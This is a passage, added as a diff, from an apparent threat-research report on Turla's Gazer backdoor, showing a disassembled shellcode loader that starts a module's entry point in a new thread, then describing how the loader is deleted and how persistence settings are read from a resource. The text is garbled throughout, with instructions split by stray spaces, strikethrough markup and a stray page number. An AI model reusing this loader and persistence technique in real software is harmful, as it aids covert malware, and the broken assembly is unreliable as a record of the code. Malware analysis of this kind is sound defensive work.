@@ -1,0 +1,82 @@
+Gazing at Gazer
+Turla’s new second stage backdoor
+```
+        launcher:
+      pus h r ax
+      su b rsp, 38h
+      movab s rax, 5D2009 2  ; @ end of payload
+      mo v qwor d pt r ss:[rsp+28], ra x ; lpThreadId
+      mo v qwor d pt r ss:[rsp+20], 0  ; dwCreationFlags
+      xo r r9d, r9 d  ; lpParameter
+      movab s r8, 5D2004 6  ; lpStartAddress => @payload
+      xo r edx, ed x  ; dwStackSize = 0
+      xo r ecx, ec x  ; lpThreadAttributes = NULL
+      cal l q wor d pt r d s:[CreateThread]
+      movab s rax, 90A7FACE90A7FAC E  ; replaced by the saved
+                          instruction pointer from
+                          thread context ;)
+      ad d rsp, 38h
+      xch g q wor d pt r s s:[rsp], r ax
+
+      r et
+
+    payload:
+      s u b r sp, 2 8
+      m ovab s r 8, 5 D20096
+
+      m o v e dx, 1
+
+      m ovab s r cx, 4 000000000000000
+      c al l q wor d p t r d s : [ DllEntryPoint]
+
+      x or e cx, e cx
+
+      c all E xitThread
+
+      i nt 3
+
+      x xxx; @DllEntryPoint
+      x xxx ; @CreateThread
+      x xxx; @ExitThread
+
+      x xxx
+
+      x xxx
+
+      x xxx
+
+      x xxx ; TID
+
+```
+The shellcode is just a loader that will execute the module entry point in a new thread.
+Persistence
+The loader sends binary data through the named pipe to the orchestrator. This blob contains:
+
+
+a command ID (2): ~~CMC_TAKE_LOADER_BODY~~
+
+
+the loader path file
+
+
+the loader PE
+
+
+Once this message is received by the orchestrator, the loader is securely deleted by overwriting
+the file content and deleted through the DeleteFile function.
+Afterwards, the persistency is set up. The persistency information is retrieved from the resource “105”
+and stored in the Gazer storage. Among these data, there is a ~~dword~~ value that is used to choose
+which persistency mode will be applied.
+The resource 105 is structured in the following way:
+
+
+a ~~dword~~ value representing the persistence mode
+
+
+a ~~dword~~ value representing the size of the data
+
+
+the persistence information
+
+
+9
